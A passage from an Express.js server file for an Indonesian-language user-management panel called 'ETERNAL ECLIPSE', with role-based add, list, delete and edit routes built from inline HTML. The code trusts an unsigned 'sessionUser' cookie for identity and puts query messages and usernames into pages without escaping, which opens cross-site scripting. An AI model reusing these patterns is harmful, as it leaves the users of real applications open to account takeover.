        body { font-family: 'Poppins', sans-serif; background: var(--bg-dark); color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; margin: 0; }
        #particles { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 0; opacity: 0.2; }
        .content { position: relative; z-index: 2; width: 100%; max-width: 450px; padding: 20px; }
        .status-card { background: rgba(10, 10, 10, 0.85); border: 1px solid rgba(255,255,255,0.1); padding: 40px; border-radius: 25px; backdrop-filter: blur(20px); text-align: center; border-top: 3px solid var(--primary); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .icon-box { width: 70px; height: 70px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: var(--primary); border: 2px solid var(--primary); border-radius: 50%; box-shadow: 0 0 15px var(--primary); }
        h2 { font-family: 'Orbitron', sans-serif; font-size: 18px; margin-bottom: 15px; letter-spacing: 3px; color: var(--primary); }
        p { color: #ccc; font-size: 13px; line-height: 1.6; margin-bottom: 30px; }
        .btn-action { display: inline-block; width: 100%; padding: 14px; background: transparent; color: var(--primary); border: 1px solid var(--primary); text-decoration: none; border-radius: 8px; font-family: 'Orbitron', sans-serif; font-weight: bold; font-size: 11px; transition: 0.3s; text-transform: uppercase; text-align: center; }
        .btn-action:hover { background: var(--primary); color: #000; box-shadow: 0 0 20px var(--primary); }
    </style>
</head>
<body>
    <div id="particles"></div>
    <div class="content">
        <div class="status-card">
            <div class="icon-box"><i class="fas ${icon}"></i></div>
            <h2>${status}</h2>
            <p>${message}</p>
            <a href="${userIndex !== -1 ? '/dashboard' : '/edit-key'}" class="btn-action">
                <i class="fas ${userIndex !== -1 ? 'fa-home' : 'fa-redo'}"></i> 
                ${userIndex !== -1 ? 'Return to System' : 'Retry Verification'}
            </a>
        </div>
    </div>
    <script>
        $(document).ready(function() {
            $('#particles').particleground({ dotColor: '${themeColor}', lineColor: '${themeColor}', density: 12000 });
        });
    </script>
</body>
</html>
    `);
});

app.get("/adduser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';

  if (!["developer", "owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Developer, Owner, Admin, dan Reseller yang bisa menambah user.");
  }

  let roleOptions = "";
  if (role === "developer") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
      <option value="admin">Admin</option>
      <option value="owner">Owner</option>
      <option value="developer">Developer</option>
    `;
  } else if (role === "owner") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
      <option value="admin">Admin</option>
      <option value="owner">Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user">User</option>
      <option value="reseller">Reseller</option>
    `;
  } else {
    roleOptions = `<option value="user">User</option>`;
  }

  const html = `
  <!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Tambah User - ETERNAL ECLIPSE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
        :root {
            --primary: #32CD32;
            --secondary: #228B22;
            --accent: #adff2f;
            --bg-dark: #050505;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            font-family: 'Poppins', sans-serif;
            background: var(--bg-dark);
            color: #fff;
            min-height: 100vh;
            padding: 40px 20px;
            position: relative;
            overflow-y: auto;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(50, 205, 50, 0.05) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(173, 255, 47, 0.05) 0%, transparent 40%);
        }

        #particles {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            z-index: 0;
            opacity: 0.5;
        }

        .content {
            position: relative;
            z-index: 2;
            max-width: 550px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 20px;
        }
        
        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(to right, #fff, var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin-bottom: 15px;
            filter: drop-shadow(0 0 15px rgba(50, 205, 50, 0.3));
        }

        .header p {
            color: #888;
            font-size: 14px;
            letter-spacing: 1px;
            font-weight: 300;
        }

        .form-container {
            background: rgba(15, 15, 15, 0.6);
            border: 1px solid var(--glass-border);
            padding: 40px;
            border-radius: 30px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            position: relative;
            overflow: hidden;
        }

        .form-container::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
        }

        .user-info {
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 20px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: 0.3s;
        }
        
        .user-info:hover {
            border-color: var(--primary);
            background: rgba(50, 205, 50, 0.02);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            font-size: 13px;
        }

        .info-label {
            color: #777;
            font-weight: 400;
        }

        .info-value {
            color: #fff;
            font-weight: 600;
            font-family: 'Rajdhani', sans-serif;
            letter-spacing: 1px;
        }

        .role-badge {
            display: inline-block;
            padding: 5px 15px;
            border-radius: 8px;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
        }

        .role-developer { background: linear-gradient(45deg, #00ff00, #00cc00); color: #000; box-shadow: 0 0 15px rgba(0, 255, 0, 0.3); }
        .role-owner { background: linear-gradient(45deg, #FFD700, #FFA500); color: #000; box-shadow: 0 0 15px rgba(255, 215, 0, 0.3); }
        .role-admin { background: linear-gradient(45deg, #FF4B2B, #FF416C); color: #fff; box-shadow: 0 0 15px rgba(255, 75, 43, 0.3); }
        .role-reseller { background: linear-gradient(45deg, #32CD32, #228B22); color: #fff; box-shadow: 0 0 15px rgba(50, 205, 50, 0.3); }
        .role-user { background: linear-gradient(45deg, #adff2f, #32CD32); color: #fff; box-shadow: 0 0 15px rgba(56, 239, 125, 0.3); }

        .form-group { margin-bottom: 25px; }

        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
            color: #aaa;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
        }

        label i { color: var(--primary); margin-right: 8px; }

        input, select {
            width: 100%;
            padding: 16px 20px;
            border-radius: 15px;
            border: 1px solid rgba(255,255,255,0.08);
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 14px;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            outline: none;
        }

        input:focus, select:focus {
            background: rgba(255, 255, 255, 0.08);
            border-color: var(--primary);
            box-shadow: 0 0 20px rgba(50, 205, 50, 0.2);
            transform: scale(1.02);
        }

        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 35px;
        }

        .btn {
            flex: 1;
            padding: 18px;
            border: none;
            border-radius: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: 'Orbitron', sans-serif;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-align: center;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-save {
            background: linear-gradient(45deg, var(--primary), var(--secondary));
            color: #fff;
            box-shadow: 0 10px 20px rgba(50, 205, 50, 0.2);
        }

        .btn-save:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(50, 205, 50, 0.4);
            filter: brightness(1.1);
        }

        .btn-back {
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .btn-back:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #fff;
            transform: translateY(-3px);
        }

        .permission-info {
            background: rgba(50, 205, 50, 0.05);
            padding: 15px;
            border-radius: 15px;
            font-size: 12px;
            color: var(--primary);
            text-align: center;
            margin-top: 25px;
            border: 1px solid rgba(50, 205, 50, 0.2);
        }

        .permission-note {
            background: rgba(255, 255, 255, 0.02);
            padding: 15px;
            border-radius: 15px;
            font-size: 11px;
            color: #666;
            text-align: center;
            margin-top: 20px;
            border: 1px solid rgba(255,255,255,0.05);
            line-height: 1.6;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-container { 
            animation: fadeInUp 0.8s cubic-bezier(0.23, 1, 0.32, 1); 
        }

        @media (max-width: 500px) {
            body { padding: 20px 15px; }
            .form-container { padding: 30px 20px; }
            .header h2 { font-size: 22px; }
            .button-group { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div id="particles"></div>

    <div class="content">
        <div class="header">
            <h2><i class="fas fa-user-plus"></i> ADD USER</h2>
            <p>Access Control & User Provisioning</p>
        </div>

        <div class="form-container">
            <div class="user-info">
                <div class="info-row">
                    <span class="info-label">Active Session:</span>
                    <span class="info-value"><i class="fas fa-circle" style="color:var(--primary); font-size:8px; margin-right:5px;"></i> ${username}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">Privilege Level:</span>
                    <span class="info-value">
                        <span class="role-badge role-${role}">
                            ${role.charAt(0).toUpperCase() + role.slice(1)}
                        </span>
                    </span>
                </div>
            </div>

            <form method="POST" action="/adduser">
                <div class="form-group">
                    <label for="username"><i class="fas fa-id-badge"></i> Username</label>
                    <input type="text" id="username" name="username" placeholder="Target identity name" required>
                </div>

                <div class="form-group">
                    <label for="password"><i class="fas fa-fingerprint"></i> Password / Key</label>
                    <input type="text" id="password" name="password" placeholder="Secure access key" required>
                </div>

                <div class="form-group">
                    <label for="role"><i class="fas fa-shield-halved"></i> Assign Role</label>
                    <select id="role" name="role" required>
                        ${roleOptions}
                    </select>
                </div>

                <div class="form-group">
                    <label for="durasi"><i class="fas fa-hourglass-half"></i> Duration (Days)</label>
                    <input type="number" id="durasi" name="durasi" min="1" max="365" placeholder="30" value="30" required>
                </div>

                <div class="permission-info">
                    <i class="fas fa-shield-check"></i> 
                    <strong>Access Protocol:</strong> 
                    ${role === 'reseller' ? 'Standard user creation only' : 
                      role === 'admin' ? 'Elevated privileges (Reseller & User)' : 
                      role === 'owner' ? 'Administrative authority (Owner, Admin, Reseller, User)' :
                      'Full developer authority enabled'}
                </div>

                <div class="button-group">
                    <button type="submit" class="btn btn-save">
                        <i class="fas fa-bolt"></i> EXECUTE CREATE
                    </button>
                    
                    <a href="/dashboard" class="btn btn-back">
                        <i class="fas fa-times"></i> ABORT
                    </a>
                </div>
            </form>
                
            <div class="permission-note">
                <i class="fas fa-info-circle"></i>
                Please review configuration. Created identities are immutable and cannot be purged by the creator.
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            $('#particles').particleground({
                dotColor: '#1a4a1a',
                lineColor: '#1a4a1a',
                minSpeedX: 0.1,
                maxSpeedX: 0.4,
                density: 10000,
                particleRadius: 3,
                curvedLines: true,
                proximity: 110
            });

            document.getElementById('role').addEventListener('change', function() {
                const selectedRole = this.value;
                const badge = document.querySelector('.user-info .role-badge');
                if (badge) {
                    badge.className = \`role-badge role-\${selectedRole}\`;
                    badge.textContent = selectedRole.charAt(0).toUpperCase() + selectedRole.slice(1);
                }
            });
        });
    </script>
</body>
</html>
  `;
  res.send(html);
});

app.post("/hapususer", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { username: targetUsername } = req.body;

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  if (sessionUsername === targetUsername) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  if (targetUser.role === 'developer') {
    return res.send("❌ Tidak bisa hapus Developer.");
  }

  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh hapus user biasa.");
  }

  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa hapus admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa hapus owner.");
    }
  }

  const filtered = users.filter(u => u.username !== targetUsername);
  saveUsers(filtered);
  
  res.redirect("/userlist?msg=User " + targetUsername + " berhasil dihapus");
});

app.get("/userlist", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const message = req.query.msg || "";

  if (!["developer", "owner", "admin", "reseller"].includes(role)) {
    return res.send("🚫 Akses ditolak. Hanya Developer, Owner, Admin, dan Reseller yang bisa mengakses user list.");
  }

  const tableRows = users.map(user => {
    const expired = new Date(user.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit"
    });
    
    const now = Date.now();
    const daysRemaining = Math.max(0, Math.ceil((user.expired - now) / 86400000));
    
    let canEdit = true;
    
    if (user.username === username) {
      canEdit = false;
    } else if (user.role === 'developer') {
      canEdit = false;
    } else if (role === "reseller" && user.role !== "user") {
      canEdit = false;
    } else if (role === "admin" && (user.role === "admin" || user.role === "owner" || user.role === "developer")) {
      canEdit = false;
    } else if (role === "owner" && (user.role === "owner" || user.role === "developer")) {
      canEdit = false;
    }
    
    const editButton = canEdit 
      ? `<a href="/edituser?username=${encodeURIComponent(user.username)}" class="btn-edit">
           <i class="fas fa-edit"></i> Edit
         </a>`
      : `<span class="btn-edit disabled" style="opacity: 0.5; cursor: not-allowed;">
           <i class="fas fa-ban"></i> Tidak Bisa Edit
         </span>`;
    
    return `
      <tr>
        <td>${user.username}</td>
        <td>
          <span class="role-badge role-${user.role || 'user'}">
            ${(user.role || 'user').charAt(0).toUpperCase() + (user.role || 'user').slice(1)}
          </span>
        </td>
        <td>${expired}</td>
        <td>${daysRemaining} hari</td>
        <td>${editButton}</td>
      </tr>
    `;
  }).join("");

  const messageHtml = message ? `
    <div style="
      background: rgba(76, 175, 80, 0.2);
      border: 1px solid #4CAF50;
      color: #4CAF50;
      padding: 15px;
      border-radius: 8px;
      margin-bottom: 20px;
      text-align: center;
    ">
      <i class="fas fa-check-circle"></i> ${message}
    </div>
  ` : '';

  const addUserButton = `
    <div style="text-align: center; margin: 20px 0;">
      <a href="/adduser" class="btn-add-user">
        <i class="fas fa-user-plus"></i> TAMBAH USER BARU
      </a>
    </div>
  `;

  const html = `
   <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>User List - ETERNAL ECLIPSE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Orbitron:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }

    body {
      font-family: 'Poppins', sans-serif;
      background: #000000;
      color: #F0F0F0;
      min-height: 100vh;
      padding: 16px;
      position: relative;
      overflow-y: auto;
      overflow-x: hidden;
    }

    #particles {
      position: fixed;
      top: 0; 
      left: 0;
      width: 100%; 
      height: 100%;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 1;
      max-width: 1200px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 30px;
      padding: 20px;
    }

    .header h2 {
      color: #F0F0F0;
      font-size: 28px;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin-bottom: 10px;
      text-shadow: 0 0 10px rgba(240, 240, 240, 0.5);
    }

    .header p {
      color: #A0A0A0;
      font-size: 14px;
    }

    .btn-add-user {
      display: inline-block;
      padding: 14px 30px;
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
      text-decoration: none;
      border-radius: 8px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      text-transform: uppercase;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      border: none;
      cursor: pointer;
      font-size: 14px;
      box-shadow: 0 4px 15px rgba(78, 205, 196, 0.3);
    }

    .btn-add-user:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(78, 205, 196, 0.5);
      background: linear-gradient(135deg, #6BFFE6, #4ECDC4);
    }

    .table-container {
      overflow-x: auto;
      border-radius: 12px;
      border: 1px solid #333333;
      background: rgba(26, 26, 26, 0.8);
      backdrop-filter: blur(10px);
      font-size: 14px;
      margin-bottom: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      min-width: 600px;
    }
    
    th, td {
      padding: 15px 12px;
      text-align: left;
      border-bottom: 1px solid #333333;
      white-space: nowrap;
    }

    th {
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-size: 12px;
      font-family: 'Orbitron', sans-serif;
    }

    td {
      background: rgba(38, 38, 38, 0.7);
      color: #E0E0E0;
      font-size: 13px;
    }

    tr:hover td {
      background: rgba(60, 60, 60, 0.8);
      transition: background 0.3s ease;
    }

    .role-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 4px;
      font-size: 11px;
      font-weight: bold;
      text-transform: uppercase;
    }

    .role-developer {
      background: linear-gradient(135deg, #00ff00, #00cc00);
      color: #000;
    }
    .role-owner {
      background: linear-gradient(135deg, #FFD700, #FFA500);
      color: #000;
    }
    .role-admin {
      background: linear-gradient(135deg, #FF6B6B, #FF8E8E);
      color: #fff;
    }
    .role-reseller {
      background: linear-gradient(135deg, #4ECDC4, #6BFFE6);
      color: #000;
    }
    .role-user {
      background: linear-gradient(135deg, #95E1D3, #B5EAD7);
      color: #000;
    }

    .btn-edit {
      display: inline-block;
      padding: 6px 12px;
      background: rgba(78, 205, 196, 0.2);
      border: 1px solid rgba(78, 205, 196, 0.5);
      border-radius: 6px;
      color: #4ECDC4;
      text-decoration: none;
      font-size: 12px;
      transition: all 0.3s ease;
    }

    .btn-edit:hover {
      background: rgba(78, 205, 196, 0.3);
      transform: translateY(-2px);
    }

    .close-btn {
      display: block;
      width: 200px;
      padding: 14px;
      margin: 30px auto;
      background: rgba(51, 51, 51, 0.9);
      color: #F0F0F0;
      text-align: center;
      border-radius: 8px;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      font-family: 'Orbitron', sans-serif;
      border: 1px solid #333333;
      cursor: pointer;
      transition: all 0.3s ease;
      box-sizing: border-box;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .close-btn:hover {
      background: rgba(240, 240, 240, 0.1);
      border-color: #F0F0F0;
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(240, 240, 240, 0.2);
    }

    .stats-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
      padding: 15px;
      background: rgba(26, 26, 26, 0.8);
      border: 1px solid #333333;
      border-radius: 8px;
      font-size: 13px;
    }

    .stat-item {
      text-align: center;
      flex: 1;
    }

    .stat-value {
      font-size: 18px;
      font-weight: bold;
      color: #F0F0F0;
      font-family: 'Orbitron', sans-serif;
    }

    .stat-label {
      font-size: 11px;
      color: #A0A0A0;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    @media (max-width: 768px) {
      .header h2 { 
        font-size: 22px; 
      }
      
      table { 
        font-size: 12px; 
      }
      
      th, td { 
        padding: 10px 8px; 
      }
      
      .stats-bar {
        flex-direction: column;
        gap: 10px;
      }
      
      .stat-item {
        text-align: left;
      }
      
      .btn-add-user {
        padding: 12px 20px;
        font-size: 12px;
      }
    }

    @media (max-width: 600px) {
      body {
        padding: 10px;
      }
      
      .header {
        padding: 10px;
      }
      
      .header h2 { 
        font-size: 18px; 
      }
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .table-container {
      animation: fadeIn 0.6s ease-out;
    }

    .table-container::-webkit-scrollbar {
      height: 8px;
    }

    .table-container::-webkit-scrollbar-track {
      background: rgba(51, 51, 51, 0.5);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb {
      background: rgba(240, 240, 240, 0.3);
      border-radius: 4px;
    }

    .table-container::-webkit-scrollbar-thumb:hover {
      background: rgba(240, 240, 240, 0.5);
    }
  </style>
</head>
<body>
  <div id="particles"></div>

  <div class="content">
    <div class="header">
      <h2><i class="fas fa-users"></i> USER LIST</h2>
      <p>ETERNAL ECLIPSE v1 - User Management System</p>
    </div>

    ${messageHtml}

    ${addUserButton}

    <div class="stats-bar">
      <div class="stat-item">
        <div class="stat-value">${users.length}</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'user').length}</div>
        <div class="stat-label">Regular Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'reseller').length}</div>
        <div class="stat-label">Resellers</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'admin').length}</div>
        <div class="stat-label">Admins</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">${users.filter(u => u.role === 'developer').length}</div>
        <div class="stat-label">Developers</div>
      </div>
    </div>

    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th><i class="fas fa-user"></i> Username</th>
            <th><i class="fas fa-shield-alt"></i> Role</th>
            <th><i class="fas fa-calendar-times"></i> Expired</th>
            <th><i class="fas fa-clock"></i> Remaining</th>
            <th><i class="fas fa-cog"></i> Actions</th>
          </tr>
        </thead>
        <tbody>
          ${tableRows}
        </tbody>
      </table>
    </div>

    <a href="/profile" class="close-btn">
      <i class="fas fa-times"></i> TUTUP PROFIL
    </a>
  </div>

  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#333333',
        lineColor: '#555555',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 8000,
        particleRadius: 2,
        curvedLines: false,
        proximity: 100
      });
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});

app.get("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const role = currentUser.role || 'user';
  const currentUsername = username;
  const targetUsername = req.query.username;

  if (!targetUsername || targetUsername === 'undefined' || targetUsername === 'null') {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error - ETERNAL ECLIPSE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    :root {
      --primary: #32CD32;
      --secondary: #228B22;
      --accent: #adff2f;
      --warning: #adff2f;
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    body { 
      font-family: 'Inter', sans-serif; 
      background: var(--bg-dark); 
      color: #fff; 
      margin: 0;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      background-image: 
          radial-gradient(circle at 50% 50%, rgba(50, 205, 50, 0.1) 0%, transparent 70%);
    }

    body::before {
      content: "";
      position: absolute;
      width: 200%;
      height: 200%;
      background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
      opacity: 0.1;
      z-index: -1;
    }

    .error { 
      position: relative;
      background: rgba(15, 15, 15, 0.7); 
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      padding: 50px 40px; 
      border-radius: 30px; 
      border: 1px solid var(--glass-border);
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.8), 
                  inset 0 0 20px rgba(255, 255, 255, 0.02);
      max-width: 450px;
      width: 90%;
      text-align: center;
      animation: slideUp 0.6s cubic-bezier(0.23, 1, 0.32, 1);
    }

    .error::after {
      content: "";
      position: absolute;
      top: 0; left: 50%;
      transform: translateX(-50%);
      width: 40%;
      height: 3px;
      background: var(--primary);
      box-shadow: 0 0 15px var(--primary);
      border-radius: 0 0 10px 10px;
    }

    .icon-container {
      font-size: 50px;
      margin-bottom: 20px;
      color: var(--warning);
      filter: drop-shadow(0 0 10px rgba(173, 255, 47, 0.4));
      animation: pulse 2s infinite;
    }

    h2 {
      font-family: 'Orbitron', sans-serif;
      font-weight: 700;
      font-size: 22px;
      margin-bottom: 20px;
      letter-spacing: 2px;
      text-transform: uppercase;
      background: linear-gradient(to right, #fff, var(--primary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    p {
      color: rgba(255, 255, 255, 0.6);
      line-height: 1.8;
      font-size: 14px;
      margin-bottom: 10px;
    }

    small {
      display: inline-block;
      padding: 5px 15px;
      background: rgba(50, 205, 50, 0.05);
      border-radius: 8px;
      margin-top: 15px;
      color: var(--primary);
      font-family: 'Courier New', monospace;
      font-size: 11px;
      letter-spacing: 1px;
      border: 1px solid rgba(50, 205, 50, 0.1);
    }

    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      padding: 16px 32px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      color: #fff;
      text-decoration: none;
      border-radius: 16px;
      margin-top: 30px;
      font-weight: 700;
      font-family: 'Orbitron', sans-serif;
      font-size: 12px;
      letter-spacing: 1px;
      transition: all 0.3s ease;
      box-shadow: 0 10px 20px rgba(50, 205, 50, 0.2);
      border: none;
      text-transform: uppercase;
    }

    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 30px rgba(50, 205, 50, 0.4);
      filter: brightness(1.1);
    }

    .btn:active {
      transform: scale(0.96);
    }

    a[style*="color: #4ECDC4"], .user-list-link {
      color: var(--primary) !important;
      text-decoration: none;
      font-weight: 600;
      border-bottom: 1px dashed var(--primary);
      transition: 0.3s;
    }

    a[style*="color: #4ECDC4"]:hover, .user-list-link:hover {
      color: #fff !important;
      border-bottom-style: solid;
      text-shadow: 0 0 10px var(--primary);
    }

    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.05); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="error">
    <div class="icon-container">
      <i class="fas fa-exclamation-circle"></i>
    </div>
    <h2>📝 Edit User</h2>
    <p>Silakan pilih user yang ingin diedit dari <a href="/userlist" class="user-list-link">User List</a></p>
    <p><small>STATUS: IDENTITY_PARAMETER_MISSING</small></p>
    
    <a href="/userlist" class="btn">
      <i class="fas fa-chevron-left"></i> Return to Directory
    </a>
  </div>
</body>
</html>
    `;
    return res.send(errorHtml);
  }

  const targetUser = users.find(u => u.username === targetUsername);

  if (!targetUser) {
    const errorHtml = `
    <!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Error - ETERNAL ECLIPSE</title>
  <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  
  <style>
    :root {
      --primary: #32CD32;
      --secondary: #228B22;
      --accent: #adff2f;
      --glow: rgba(50, 205, 50, 0.4);
      --bg-dark: #050505;
      --glass: rgba(255, 255, 255, 0.03);
      --glass-border: rgba(255, 255, 255, 0.1);
    }

    body { 
      font-family: 'Inter', sans-serif; 
      background: var(--bg-dark); 
